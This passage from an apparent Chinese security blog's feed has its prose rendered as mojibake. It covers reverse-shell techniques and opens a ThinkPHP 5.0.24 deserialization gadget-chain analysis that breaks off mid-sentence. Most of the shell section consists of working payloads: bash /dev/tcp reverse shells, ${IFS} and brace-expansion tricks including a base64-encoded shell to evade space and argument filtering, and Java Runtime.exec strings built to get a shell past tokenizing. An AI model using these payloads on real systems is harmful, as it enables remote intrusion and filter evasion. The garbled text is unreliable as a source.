64 2Êúà  29 12:48 1 -> 'pipe:[1487309]'lrwx------ 1 test test 64 2Êúà  29 12:48 2 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:48 5 -> 'socket:[1487308]'// bashtest@test:/tmp$ ls -l /proc/30651/fdÊÄªÁî®Èáè 0lr-x------ 1 test test 64 2Êúà  29 12:48 0 -> 'pipe:[1487309]'lrwx------ 1 test test 64 2Êúà  29 12:48 1 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:48 2 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:48 255 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:48 5 -> 'socket:[1487308]'</code></pre><h4 id="È¢ùÂ§ñÁöÑ‰æãÂ≠ê"><a href="#È¢ùÂ§ñÁöÑ‰æãÂ≠ê" class="headerlink" title="È¢ùÂ§ñÁöÑ‰æãÂ≠ê"></a>È¢ùÂ§ñÁöÑ‰æãÂ≠ê</h4><p><code>&lt;&amp;996 &gt;&amp;996 2&gt;&amp;996</code>ÂàÜÂà´ÂØπÂ∫îÂ§çÂà∂Âà∞<code>stdin stdout stderr</code></p><pre class=" language-shell"><code class="language-shell">0<&996;exec 996<>/dev/tcp/127.0.0.1/12345;sh <&996 >&996 2>&996// ÂèòÂΩ¢exec 996<>/dev/tcp/127.0.0.1/123450 <&996 >&996 2>&996</code></pre><p>Ê≥®ÊÑèÔºöÂèòÂΩ¢ÁöÑÂëΩ‰ª§Âú®ËøûÊé•Á´ØÈÄÄÂá∫‰ºöÂØºËá¥Ê≠§Á´ØÂêåÊó∂ÈÄÄÂá∫ÔºåÂéüÂõ†Â¶Ç‰∏ãÔºö</p><pre class=" language-shell"><code class="language-shell">// 0<&996;exec 996<>/dev/tcp/127.0.0.1/12345;sh <&996 >&996 2>&996test     18999  2516  0 14:44 pts/0    00:00:00 bashtest@test:~$ ls -l /proc/18999/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  29 14:44 0 -> 'socket:[106812]'lrwx------ 1 test test 64 2Êúà  29 14:44 1 -> 'socket:[106812]'lrwx------ 1 test test 64 2Êúà  29 14:45 196 -> 'socket:[106812]'lrwx------ 1 test test 64 2Êúà  29 14:44 2 -> 'socket:[106812]'lrwx------ 1 test test 64 2Êúà  29 14:44 255 -> /dev/pts/0---// exec 996<>/dev/tcp/127.0.0.1/123450 <&996 >&996 2>&996test     18999  2516  0 14:44 pts/0    00:00:00 bashtest     20566 18999  0 14:53 pts/0    00:00:00 shtest@test:~$ ls -l /proc/18999/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  29 14:44 0 -> /dev/pts/0lrwx------ 1 test test 64 2Êúà  29 14:44 1 -> /dev/pts/0lrwx------ 1 test test 64 2Êúà  29 14:45 196 -> 'socket:[105103]'lrwx------ 1 test test 64 2Êúà  29 14:44 2 -> /dev/pts/0lrwx------ 1 test test 64 2Êúà  29 14:44 255 -> /dev/pts/0test@test:~$ ls -l /proc/20566/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  29 14:53 0 -> 'socket:[105103]'lrwx------ 1 test test 64 2Êúà  29 14:53 1 -> 'socket:[105103]'lrwx------ 1 test test 64 2Êúà  29 14:53 196 -> 'socket:[105103]'lrwx------ 1 test test 64 2Êúà  29 14:53 2 -> 'socket:[105103]'</code></pre><h3 id="ÂÖ∂‰ªñ"><a href="#ÂÖ∂‰ªñ" class="headerlink" title="ÂÖ∂‰ªñ"></a>ÂÖ∂‰ªñ</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15829596110947.jpg" alt="https://xz.aliyun.com/t/2549#toc-8"></p><h2 id="ÂèçÂºπ-in-Java"><a href="#ÂèçÂºπ-in-Java" class="headerlink" title="ÂèçÂºπ in Java"></a>ÂèçÂºπ in Java</h2><h3 id="Runtime-getRuntime-exec"><a href="#Runtime-getRuntime-exec" class="headerlink" title="Runtime.getRuntime().exec"></a>Runtime.getRuntime().exec</h3><h4 id="exec-new-String"><a href="#exec-new-String" class="headerlink" title="exec(new String[])"></a>exec(new String[])</h4><p>Âú®Ê≠§Ê®°ÂºèËß£ÊûêÁöÑÂÖ≥ÈîÆÊòØ<code>java.lang.UNIXProcess#UNIXProcess</code>ÔºåÂú®<code>-c</code>Ê®°Âºè‰∏ãÔºåÂèØ‰ª•ÁúãÂà∞ÂèÇÊï∞‰∏∫‰∏§‰∏™</p><p>P.S. ‰∏™‰∫∫ËÆ§‰∏∫ÊòØÂõ†‰∏∫Â¶Ç<code>&gt;&amp;</code>Á≠âÂèÇÊï∞Êó†Ê≥ïË¢´ËØÜÂà´‰∏∫bashÂèÇÊï∞ÔºåÂÆÉÂ∫îÂ±û‰∫éÂΩìÂâç bash ÁéØÂ¢É‰∏ãÁöÑÊìç‰Ωú</p><ol><li><p>Áõ¥Êé•Êï∞ÁªÑÂåñÊó†Ê≥ïËß£ÊûêÔºåËß£ÊûêÂèÇÊï∞‰∏∫ 4 ‰∏™</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816475716996.jpg" alt="-w1640"><br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15840206558058.jpg" alt="-w1005"></p></li><li><p>Êï∞ÁªÑÂåñ with <code>-c</code>ËÉΩÊ≠£Á°ÆËß£ÊûêÔºåËß£ÊûêÂèÇÊï∞‰∏∫ 2 ‰∏™</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816478550627.jpg" alt="-w1680"><br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816487793325.jpg" alt="-w996"></p></li></ol><h4 id="exec-new-String-1"><a href="#exec-new-String-1" class="headerlink" title="exec(new String)"></a>exec(new String)</h4><p>Â¶ÇÊûúÊàë‰ª¨Âè™‰º†ÂÖ•‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Êó∂Ôºå‰ºöÁªèËøá StringTokenizer ÂàÜÂâ≤ÔºåÊ≥®ÊÑè‰ºöËØÜÂà´<strong>‰∫î‰∏™</strong>Â≠óÁ¨¶</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816481561408.jpg" alt="-w537"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816521932598.jpg" alt="-w631"></p><p>ÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÊâæÂà∞‰∏Ä‰∏™Â≠óÁ¨¶ËÉΩÂ§üÁªïËøáÂàÜÂâ≤‰∏îËÉΩË¢´<code>/bin/bash</code>Ê≠£Á°ÆËØÜÂà´‰∏∫Á©∫Ê†º</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="IFS"><a href="#IFS" class="headerlink" title="${IFS}"></a>${IFS}</h3><blockquote><p>‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãÔºå<code>$var</code>‰∏é<code>${var}</code>Âπ∂Ê≤°ÊúâÂï•‰∏ç‰∏ÄÊ†∑„ÄÇ‰ΩÜÊòØÁî®<code>${ }</code>‰ºöÊØîËæÉÁ≤æÁ°ÆÁöÑÁïåÂÆöÂèòÈáèÂêçÁß∞ÁöÑËåÉÂõ¥</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816540712094.jpg" alt="-w489"></p><p>Â¶ÇÊûúÁõ¥Êé•Âà©Áî®‰ºöÊä•Èîô<code>ambiguous redirect(Ê≠ß‰πâÈáçÂÆöÂêë)</code></p><pre class=" language-shell"><code class="language-shell"># Êä•Èîô ambiguous redirectbash-3.2$ bash${IFS}-i${IFS}>&${IFS}/dev/tcp/127.0.0.1/12345${IFS}0>&1bash: ${IFS}/dev/tcp/127.0.0.1/12345${IFS}0: ambiguous redirect# Ê≠£Â∏∏bash-3.2$ bash${IFS}-i${IFS}>&${IFS}/dev/tcp/127.0.0.1/12345 0>&1</code></pre><p>ÈÇ£‰πàÊúÄÂêé‰∏Ä‰∏™Á©∫Ê†ºËØ•Â¶Ç‰ΩïÂ§ÑÁêÜÂë¢ÔºåÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞ÔºåÁªèËøá<code>&gt;&amp; socks</code>ÂêéÔºåstdou stderr Â∑≤ÁªèË¢´ÈáçÂÆöÂêëÂà∞‰∫Ü socks Êñá‰ª∂ÔºåÊúÄÂêé‰∏ÄÂè•<code>0&gt;&amp;1</code>Â∞±ÊòØËØïÂõæÂ∞Ü stdin ‰πüÈáçÂÆöÂêëËøáÂéª</p><pre class=" language-bash"><code class="language-bash">test@test:~$ <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345test@test:~$ <span class="token function">ls</span> -l /proc/14067/fdÊÄªÁî®Èáè 0lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2Êúà  27 23:05 0 -<span class="token operator">></span> /dev/pts/1lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2Êúà  27 23:05 1 -<span class="token operator">></span> <span class="token string">'socket:[924955]'</span>lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2Êúà  27 23:05 10 -<span class="token operator">></span> /dev/ttylrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2Êúà  27 23:05 2 -<span class="token operator">></span> <span class="token string">'socket:[924955]'</span></code></pre><p>Ê≥®ÊÑèÂà∞<code>Êñá‰ª∂ÊèèËø∞Á¨¶ÁöÑÂ§çÂà∂</code>‰∏≠<code>[n]&lt;&amp;word</code>Ê†ºÂºèÔºåÊàë‰ª¨ÂèØ‰ª•Â∞Ü socks Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂Âà∞ stdin ‰∏≠</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 0<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true"># Ê∑ªÂä† IFS</span><span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token variable">${IFS}</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token variable">${IFS}</span>/dev/tcp/127.0.0.1/12345<span class="token variable">${IFS}</span>0<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1</code></pre><p>ÂêåÊó∂Áî±‰∫é n ÈªòËÆ§‰∏∫ stdinÔºåÈÇ£‰πàÊàë‰ª¨‰πüÂèØ‰ª•Âà©Áî®Ê≠§ËßÑÂàô‰∏çÂá∫Áé∞ 0</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 <span class="token operator">&lt;</span><span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true"># Ê∑ªÂä† IFS</span><span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token variable">${IFS}</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token variable">${IFS}</span>/dev/tcp/127.0.0.1/12345<span class="token variable">${IFS}</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span>1</code></pre><p>ÁîöËá≥ÁúÅÁï•ÊúÄÂêéÁöÑÁ©∫Ê†ºÔºå‰ª•ÂèäÈùûÂøÖË¶ÅÁöÑÁ©∫Ê†º</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true"># Ê∑ªÂä† IFS</span><span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token variable">${IFS}</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token variable">${IFS}</span>/dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true"># ÁúÅÁï•ÈùûÂøÖË¶ÅÁ©∫Ê†º+IFS ÊµãËØï</span>test@test:~$ <span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token operator">></span><span class="token operator">&amp;</span>/dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1test@test:~$ <span class="token function">ls</span> -l /proc/14556/fdÊÄªÁî®Èáè 0lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2Êúà  27 23:08 0 -<span class="token operator">></span> <span class="token string">'socket:[928815]'</span>lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2Êúà  27 23:08 1 -<span class="token operator">></span> <span class="token string">'socket:[928815]'</span>lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2Êúà  27 23:08 2 -<span class="token operator">></span> <span class="token string">'socket:[928815]'</span>lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2Êúà  27 23:08 255 -<span class="token operator">></span> /dev/tty</code></pre><h3 id="bash-Brace-Expansion"><a href="#bash-Brace-Expansion" class="headerlink" title="bash Brace Expansion"></a>bash Brace Expansion</h3><p>Ëä±Êã¨Âè∑Êâ©Â±ïÔºåËØ¶ÁªÜËßÅÂèÇËÄÉËµÑÊñô 3</p><pre class=" language-shell"><code class="language-shell">test@test:~$ echo hello{'world','linux'},helloworld, hellolinux,test@test:~$ echo hello{1..5},hello1, hello2, hello3, hello4, hello5,</code></pre><pre class=" language-shell"><code class="language-shell">test@test:~$ bash -c "{echo,YmFzaCAtaT4mL2Rldi90Y3AvMTI3LjAuMC4xLzEyMzQ1PCYxCg==}|{base64,-d}|{bash,-i}"Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaT4mL2Rldi90Y3AvMTI3LjAuMC4xLzEyMzQ1PCYxCg==}|{base64,-d}|{bash,-i}");</code></pre><h3 id><a href="#" class="headerlink" title="$@ $*"></a><code>$@</code> <code>$*</code></h3><p>ÁªÜËäÇÂèäÂå∫Âà´ËØ¶ËßÅÔºö<a href="http://c.biancheng.net/cpp/view/2739.html" target="_blank" rel="noopener">ShellÁâπÊÆäÂèòÈáè</a></p><table><thead><tr><th>ÂèÇÊï∞Â§ÑÁêÜ</th><th>ËØ¥Êòé</th></tr></thead><tbody><tr><td><code>$*</code></td><td>‰ª•‰∏Ä‰∏™ÂçïÂ≠óÁ¨¶‰∏≤ÊòæÁ§∫ÊâÄÊúâÂêëËÑöÊú¨‰º†ÈÄíÁöÑÂèÇÊï∞„ÄÇ<br>Â¶Ç<code>$*</code>Áî®<code>&quot;</code>Êã¨Ëµ∑Êù•ÁöÑÊÉÖÂÜµ„ÄÅ‰ª•<code>$1 $2 ‚Ä¶ $n</code>ÁöÑÂΩ¢ÂºèËæìÂá∫ÊâÄÊúâÂèÇÊï∞„ÄÇ</td></tr><tr><td><code>$@</code></td><td>‰∏é<code>$*</code>Áõ∏ÂêåÔºå‰ΩÜÊòØ‰ΩøÁî®Êó∂Âä†ÂºïÂè∑ÔºåÂπ∂Âú®ÂºïÂè∑‰∏≠ËøîÂõûÊØè‰∏™ÂèÇÊï∞„ÄÇ<br>Â¶Ç<code>$@</code>Áî®<code>&quot;</code>Êã¨Ëµ∑Êù•ÁöÑÊÉÖÂÜµ„ÄÅ‰ª•<code>&quot;$1&quot; &quot;$2&quot; ‚Ä¶ &quot;$n&quot;</code>ÁöÑÂΩ¢ÂºèËæìÂá∫ÊâÄÊúâÂèÇÊï∞„ÄÇ</td></tr></tbody></table><p>‰ª•‰∏ãÂÜÖÂÆπÊù•Ëá™</p><p>ÈÇ£‰πàÊàë‰ª¨Â∞±ÂèØ‰ª•Âà©Áî®Êù•ÂèçÂºπshell‰∫Ü„ÄÇÁúãbashËØ≠Ê≥ïÔºö</p><pre class=" language-shell"><code class="language-shell">bash [options] [command_string | file]-c   If the -c option is present, then commands are read from the first non-option argument command_string.If there are arguments after the command_string, they are assigned to the positional parameters, starting with $0.</code></pre><p>ÁªìÂêàbashÂíå$@ÔºåÊàë‰ª¨ÂèØ‰ª•Âèò‰∏∫Ôºö</p><pre class=" language-shell"><code class="language-shell">/bin/sh -c '$@|sh' xxx  echo ls</code></pre><p>ÂèØ‰ª•ÊàêÂäüÂú∞ÊâßË°å<code>ls</code>„ÄÇÂàÜÊûê‰∏ãËøô‰∏™ÂëΩ‰ª§ÔºåÂΩì<code>bash</code>Ëß£ÊûêÂà∞<code>&#39;$@|sh&#39; xxx echo ls</code>ÔºåÂèëÁé∞<code>$@</code>„ÄÇ<code>$@</code>ÈúÄË¶ÅÂèñËÑöÊú¨ÁöÑÂèÇÊï∞ÔºåÈÇ£‰πàÂ∞±‰ºöËß£Êûê<code>xxx echo ls</code>ÔºåÁî±‰∫é<code>$@</code>Âè™‰ºöÂèñËÑöÊú¨ÂèÇÊï∞Ôºå‰ºöÂ∞ÜÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ËÆ§‰∏∫ÊòØËÑöÊú¨ÂêçÁß∞<strong>(ËÆ§‰∏∫<code>xxx</code>ÊòØËÑöÊú¨ÂêçÁß∞)</strong>ÔºåÂ∞±‰ºöÂèñÂà∞<code>echo ls</code>„ÄÇÈÇ£‰πàÊúÄÁªàÊâßË°åÁöÑÂ∞±ÊòØ<code>echo ls|sh</code>ÔºåÂ∞±ÂèØ‰ª•ÊàêÂäüÂú∞ÊâßË°å<code>ls</code>ÂëΩ‰ª§‰∫Ü„ÄÇ</p><p>Âà©Áî®‰∏äÈù¢Ëøô‰∏™<code>trick</code>ÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÂèØ‰ª•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§‰∫ÜÔºåÂåÖÊã¨ÂèçÂºπshell„ÄÇÂ¶Ç<code>/bin/bash -c &#39;$@|bash&#39; 0 echo &#39;bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1&#39;</code>ÊúÄÁªàÂèØ‰ª•ÊàêÂäüÂú∞ÂèçÂºπshell</p><pre class=" language-shell"><code class="language-shell">Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/8888 0>&1");Runtime.getRuntime().exec("/bin/bash -c $*|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/8888 0>&1");</code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15831418726956.jpg" alt="-w974"></p><p>ÊúÄÁªàÁõ∏ÂΩì‰∫éÊâßË°å‰∫Ü<code>echo &#39;bash -i &gt;&amp;/dev/tcp/127.0.0.1/8888 0&gt;&amp;1&#39;|bash</code>ÂëΩ‰ª§ÔºåÊàêÂäüÂèçÂºπshell</p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://xz.aliyun.com/t/2548#toc-0" target="_blank" rel="noopener">LinuxÂèçÂºπshellÔºà‰∏ÄÔºâÊñá‰ª∂ÊèèËø∞Á¨¶‰∏éÈáçÂÆöÂêë</a></li><li><a href="https://xz.aliyun.com/t/2549#toc-8" target="_blank" rel="noopener">Linux ÂèçÂºπshellÔºà‰∫åÔºâÂèçÂºπshellÁöÑÊú¨Ë¥®</a></li><li><a href="https://www.cnblogs.com/leixiao-/p/10216571.html" target="_blank" rel="noopener">linux‰∏ãÂΩ¢Â¶Ç{command,parameter,parameter}ÊâßË°åÂëΩ‰ª§ / bashËä±Êã¨Âè∑Êâ©Â±ï</a></li><li><a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/" target="_blank" rel="noopener">ÁªïËøáexecËé∑ÂèñÂèçÂºπshell</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Á¨îËÆ∞&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Thinkphp 5.0.x ÂèçÂ∫èÂàóÂåñÁÆÄÊûê</title>
    <link href="https://blog.sari3l.com/posts/56fcf5d8/"/>
    <id>https://blog.sari3l.com/posts/56fcf5d8/</id>
    <published>2020-02-26T07:49:46.000Z</published>
    <updated>2020-07-06T09:45:08.157Z</updated>
    
    <content type="html"><![CDATA[<ul><li>TP 5.0.24 &amp; PHP 5.6.40</li></ul><p>‰øÆÊîπ<code>application/index/controller/Index.php</code>ÂÜÖÂÆπ</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Welcome thinkphp 5.0.24"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$input</span><span class="token punctuation">;</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="ÁÆÄÊûê"><a href="#ÁÆÄÊûê" class="headerlink" title="ÁÆÄÊûê"></a>ÁÆÄÊûê</h2><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct"></a>__destruct</h3><p>ËøôÈáåÂíå5.1.37ÈÇ£ÁØáÊñáÁ´†ÂºÄÂ§¥ÊúâÁÇπÂÉèÔºåÂè™Êúâ<code>\think\process\pipes\Windows::__destruct</code>‰∏≠Â§ö‰ΩøÁî®‰∫Ü‰∏Ä‰∏™ removeFiles ÊñπÊ≥ïÔºåË∑üËøõÂêéÔºåÂèØËßÅË∞ÉÁî® file_existsÔºåÈÄöËøáÊ≥®ÈáäÂèØËßÅÂèÇÊï∞Á±ªÂûã‰∏∫ stringÔºåËøôÊ†∑‰ºöË∞ÉÁî®<code>$filename -&gt; __toString()</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826470016466.jpg" alt="-w871"></p><h3 id="Âà©Áî®ÁÇπ"><a href="#Âà©Áî®ÁÇπ" class="headerlink" title="Âà©Áî®ÁÇπ"></a>Âà©Áî®ÁÇπ</h3><p>ÂèØ‰ª•ÁúãÂà∞ Collection„ÄÅModel ÊòØË∞ÉÁî®‰∫ÜÂÖ∂‰∏ãÁöÑ toJson ÊñπÊ≥ï</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826936451605.jpg" alt="-w725"></p><p>Âú®<code>\think\Collection::toArray</code>‰∏≠ÔºåÂèØ‰ª•ÁúãÂà∞‰πüÊòØÈúÄË¶ÅÂà©Áî® Model Á±ª</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826936245004.jpg" alt="-w574"></p><p>ÊâÄ‰ª•Êàë‰ª¨Áõ¥Êé•Áúã<code>\think\Model::toArray</code>Âç≥ÂèØÔºåÂú®ËøΩÂä†Â±ûÊÄßÈò∂ÊÆµÔºåÊúâ‰∏â‰∏™Âú∞ÊñπÂèØËÉΩËÉΩÂà©Áî®<code>__call</code></p><ol><li>ÈúÄË¶ÅÊéßÂà∂‰º†ÂÖ• name Êù•ÊéßÂà∂ key Âèä attrÔºåÂêåÊó∂ÁõÆÊ†á __call ËÉΩËß£ÊûêÊï∞ÁªÑÂèÇÊï∞</li><li>ÈúÄË¶ÅÁõÆÊ†áÁ±ª‰∏ã __call Êàñ getBindAttr ÊúâËâØÂ•ΩÁöÑÂà©Áî®Êù°‰ª∂</li><li>ÈúÄË¶ÅÊéßÂà∂‰º†ÂÖ• attrÔºåÂêåÊó∂ÁõÆÊ†áÁ±ª‰∏ã __call ÊúâËâØÂ•ΩÁöÑÂà©Áî®Êù°‰ª∂</li></ol><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826939320759.jpg" alt="-w823"></p><p>ÊñáÁ´†‰∏≠Âà©Áî®Á¨¨‰∏â‰∏™ÁÇπÔºåÁªßÁª≠ÂàÜÊûê</p><h3 id="Â¶Ç‰ΩïÂà∞ËææÂà©Áî®ÁÇπ"><a href="#Â¶Ç‰ΩïÂà∞ËææÂà©Áî®ÁÇπ" class="headerlink" title="Â¶Ç‰ΩïÂà∞ËææÂà©Áî®ÁÇπ"></a>Â¶Ç‰ΩïÂà∞ËææÂà©Áî®ÁÇπ</h3><p>ÊÉ≥Ë¶ÅÂà∞ËææÂà©Áî®ÁÇπÔºåÈúÄË¶ÅÊàë‰ª¨Ê¢≥ÁêÜ‰∏≠Èó¥ÁöÑÈÄªËæëÊµÅÁ®ã</p><ol><li><code>$this-&gt;append</code>‰∏ç‰∏∫Á©∫</li><li><code>$name</code>‰∏ç‰∏∫Êï∞ÁªÑÔºå‰∏çÂ≠òÂú®<code>.</code>Ôºå‰∏î‰∏∫ÂΩìÂâçÁ±ª‰∏≠ÊñπÊ≥ïÂêç</li><li>ÈÄöËøá<code>$this-&gt;$$name()</code>ÊéßÂà∂<code>$modelRelation</code>‰ªéËÄåÊéßÂà∂ÂèÇÊï∞<code>$attr</code>ÔºåÂèØ‰ª•ÁúãÂà∞<code>getError</code>ÊòØÊúÄÂêàÈÄÇÁöÑ<br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826955438147.jpg" alt="-w311"></li><li>ÈÄöËøá<code>$this-&gt;getRelationData</code>ÊéßÂà∂ÁõÆÊ†áÁ±ª<code>$value</code></li></ol><p>ÂêåÊó∂‰∏∫‰∫ÜÊñπ‰æøÊéßÂà∂ÁõÆÊ†áÁ±ª<code>$value</code>ÔºåÂú® getRelationData Êó∂Â∞ΩÈáèÊéßÂà∂Á¨¨‰∏Ä‰∏™ if ÈÄªËæëÁõ¥Êé•ËøîÂõû<code>$this-&gt;parent</code><br>    <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826947783395.jpg" alt="-w1024"></p><h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><p>Áé∞Âú®Êàë‰ª¨È¶ñÂÖàÈúÄË¶ÅÁ°ÆÂÆöÁõÆÊ†áÁ±ªÔºåÂèÇÊï∞Á±ª</p><h4 id="modelRelation"><a href="#modelRelation" class="headerlink" title="modelRelation"></a>modelRelation</h4><p>Ê†πÊçÆ‰∏äÈù¢ getRelationData ‰∏≠ÁöÑÈÄªËæëÂà§Êñ≠ÔºåÈúÄË¶ÅÊéßÂà∂</p><ol><li><code>$modelRelation-&gt;isSelfRelation == false</code></li><li><code>$modelRelation-&gt;getModel == ÁõÆÊ†áÁ±ª</code></li></ol><p>Ê≥®ÊÑèËøòÈúÄË¶Å3. <code>$modelRelation-&gt;getBindAttr()</code>ÂèØÊéß</p><p>Ê†πÊçÆÁ¨¨‰∏Ä‰∏™Êù°‰ª∂ÔºåÊàë‰ª¨Êü•ËØ¢ÁªßÊâø Relation ÁöÑÁ±ªÔºåÂêåÊó∂Áî±‰∫é Relation ÂÆûÁé∞‰∫Ü getModel ÊñπÊ≥ïÂπ∂ÂèØÊéßÔºåÂøΩÁï•Á¨¨‰∫å‰∏™Êù°‰ª∂</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826960259287.jpg" alt="-w419"></p><p>Ê†πÊçÆÁ¨¨‰∏â‰∏™Êù°‰ª∂ÔºåÂèØ‰ª•ÁúãÂà∞Âè™Êúâ<code>\think\model\relation\OneToOne::getBindAttr</code>ÂÆûÁé∞ÔºåÂÖ∂‰ªñÁöÑÁ±ªÊó¢Ê≤°ÊúâËá™Ë∫´ÂÆûÁé∞ÔºåÂêåÊó∂‰πüÊ≤°ÊúâË¢´ÁªßÊâøÂÆûÁé∞</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826964065423.jpg" alt="-w369"></p><p>‰ΩÜÁî±‰∫éÂÆÉÊú¨Ë∫´ÊòØ‰∏Ä‰∏™Êé•Âè£Á±ªÔºåÊàë‰ª¨ÈúÄË¶ÅÂà©Áî®ÂÖ∂Â≠êÁ±ª<code>BelongsTo</code>Êàñ<code>HasOne</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/56fcf5d8/15826966406977.jpg" alt="-w401"></p><hr><p>Êúâ‰∫∫‰ºöËØ¥ÔºöÂèØÂê¶Âà©Áî® else 